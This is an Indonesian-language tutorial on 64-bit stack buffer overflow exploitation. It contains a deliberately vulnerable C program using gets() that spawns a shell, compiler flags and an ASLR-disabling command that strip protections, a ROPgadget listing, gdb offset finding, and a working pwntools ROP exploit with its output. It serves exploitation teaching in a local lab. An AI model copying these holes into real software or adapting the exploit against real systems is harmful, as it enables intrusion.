[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NO NX ~ -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

sourcenya sama dengan yang 32 bit (0x03-fungsi dengan param - 32)

```c
#include<stdio.h>

void hackrich(int a, int b)
{
    if(a==0x10 && b==0x15)
    {
        printf("Hacked !!!!!\n");
        system("/bin/sh");
    }
    else if(a==0x10)
    {
	    printf("your second parameter is wrong!! \n");
    }
    else
    {
	    printf("you are NOOB !!\n");
    }
}

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan Canary,NX,PIE

```bash
gcc -g -m64 -fno-stack-protector -z execstack -no-pie -o vuln64 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

pada aplikasi yang dikompilasi dengan 64 bit

jalankan program vuln64 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln64
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

parameter disimpan pada register tidak seperti 32bit pada memory

parameter 1 disimpan di RDI
parameter 2 disimpan di RSI
parameter 3 disimpan di RDX
parameter 4 disimpan di RCX
parameter 5 disimpan di R8
parameter 6 disimpan di R9

untuk mengisi register diatas harus mengarahkan RIP ke fungsi hackrich tapi kemudian harus diarahkan ke gadget untuk mendapatkan isi param sesuai operasi

untuk mendapat gadget dari vuln64

```bash
ROPgadget --binary=./vuln64
Gadgets information
============================================================
0x0000000000401089 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x00000000004011cf : add al, ch ; retf 0xffff
0x00000000004010bb : add bh, bh ; loopne 0x401125 ; nop ; ret
0x00000000004011cd : add byte ptr [rax], al ; add al, ch ; retf 0xffff
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401138 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; jmp 0x4010d0
0x0000000000401088 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x000000000040113a : add byte ptr [rax], al ; nop dword ptr [rax] ; jmp 0x4010d0
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x000000000040108e : add byte ptr [rax], al ; ret
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x000000000040108d : add byte ptr [rax], r8b ; ret
0x0000000000401127 : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004010ba : add dil, dil ; loopne 0x401125 ; nop ; ret
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401128 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x0000000000401013 : add esp, 8 ; ret
0x0000000000401012 : add rsp, 8 ; ret
0x00000000004011d4 : call qword ptr [rax + 0x1f0fc35d]
0x000000000040119b : call qword ptr [rax + 0x4855c3c9]
0x0000000000401178 : call qword ptr [rax + 0x7d8320eb]
0x0000000000401010 : call rax
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401224 : fmul qword ptr [rax - 0x7d] ; ret
0x000000000040108a : hlt ; nop dword ptr [rax + rax] ; ret
0x000000000040100e : je 0x401012 ; call rax
0x00000000004010b5 : je 0x4010c0 ; mov edi, 0x404040 ; jmp rax
0x00000000004010f7 : je 0x401100 ; mov edi, 0x404040 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401140 : jmp 0x4010d0
0x000000000040117a : jmp 0x40119c
0x00000000004010bc : jmp rax
0x000000000040119d : leave ; ret
0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x00000000004010bd : loopne 0x401125 ; nop ; ret
0x0000000000401122 : mov byte ptr [rip + 0x2f17], 1 ; pop rbp ; ret
0x00000000004010b7 : mov edi, 0x404040 ; jmp rax
0x0000000000401179 : nop ; jmp 0x40119c
0x000000000040119c : nop ; leave ; ret
0x00000000004011d5 : nop ; pop rbp ; ret
0x00000000004010bf : nop ; ret
0x000000000040108b : nop dword ptr [rax + rax] ; ret
0x000000000040113c : nop dword ptr [rax] ; jmp 0x4010d0
0x000000000040123d : nop dword ptr [rax] ; ret
0x00000000004010b6 : or dword ptr [rdi + 0x404040], edi ; jmp rax
0x0000000000401234 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401236 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401238 : pop r14 ; pop r15 ; ret
0x000000000040123a : pop r15 ; ret
0x0000000000401233 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401237 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401129 : pop rbp ; ret
0x000000000040123b : pop rdi ; ret
0x0000000000401239 : pop rsi ; pop r15 ; ret
0x0000000000401235 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401016 : ret
0x00000000004011d1 : retf 0xffff
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401245 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401244 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x00000000004010b3 : test eax, eax ; je 0x4010c0 ; mov edi, 0x404040 ; jmp rax
0x00000000004010f5 : test eax, eax ; je 0x401100 ; mov edi, 0x404040 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax

Unique gadgets found: 72
```

untuk mencari param ke satu dilakukan sebagai berikut

```bash
$ROPgadget --binary=./vuln64| grep -i 'pop rdi'
0x000000000040123b : pop rdi ; ret
```

untuk mencari param ke dua dilakukan sebagai berikut

```bash
$ROPgadget --binary=./vuln64| grep -i 'pop rsi'
0x0000000000401239 : pop rsi ; pop r15 ; ret
```

sebelumnya mencari lokasi sampai EBP adalah sebagai berikut

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/You_Tube/Stack_Buffer_Overflow/2/vuln64 
give me your input :)

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe4e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fb4a00 --> 0xfbad2288 
RDX: 0x7ffff7fb68d0 --> 0x0 
RSI: 0x405671 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe4e1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe518 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x4011c6 (<foo+39>: ret)
R8 : 0x4056d5 --> 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x246 
R12: 0x401060 (<_start>: xor    ebp,ebp)
R13: 0x7fffffffe600 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011bf <foo+32>: call   0x401050 <gets@plt>
   0x4011c4 <foo+37>: nop
   0x4011c5 <foo+38>: leave  
=> 0x4011c6 <foo+39>: ret    
   0x4011c7 <main>: push   rbp
   0x4011c8 <main+1>: mov    rbp,rsp
   0x4011cb <main+4>: mov    eax,0x0
   0x4011d0 <main+9>: call   0x40119f <foo>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe518 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe520 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe528 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe530 ("AJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe538 ("AAKAAgAA6AAL")
0040| 0x7fffffffe540 --> 0x4c414136 ('6AAL')
0048| 0x7fffffffe548 --> 0x4011c7 (<main>: push   rbp)
0056| 0x7fffffffe550 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011c6 in foo () at vuln_program.c:29
29 }
gdb-peda$ pattern offset 0x4147414131414162
4703800084066812258 found at offset: 48

```

sehingga sampai RBP akhir = 48 bytes + 8 bytes (64 bit) = 56

![[stack-frame-64-dengan-param.png]]

karena penggunaan pwn memudahkan untuk penulisan 64 bit yang banyak 0 nya
contoh untuk alamat pop rdi ; ret  0x000000000040123b bisa cukup ditulis dengan p64(0x40123b)

sehingga exploit untuk source diatas adalah sebagai berikut

```python
# padding --> 56
# hackrich --> 0x401142
# pop rdi ; ret -->0x40123b 
# pop rsi ; pop r15 ; ret -->0x401239

from pwn import *
p = process('./vuln64')
print(p.recv())
padding = b'A'*56
pop_rdi = p64(0x40123b)
val_rdi = p64(0x10)
pop_rsi_pop_r15 = p64(0x401239)
val_rsi = p64(0x15)
val_r15 = p64(0x0)
hackrich = p64(0x401142)

p.sendline(padding+pop_rdi+val_rdi+pop_rsi_pop_r15+val_rsi+val_r15+hackrich)
print(p.clean())
p.interactive()

```

hasilnya sebagai berikut

```bash
$python3 exploit64.py 
[+] Starting local process './vuln64': pid 16784
b'give me your input :)\n'
b'\nHacked !!!!!\n'
[*] Switching to interactive mode
```
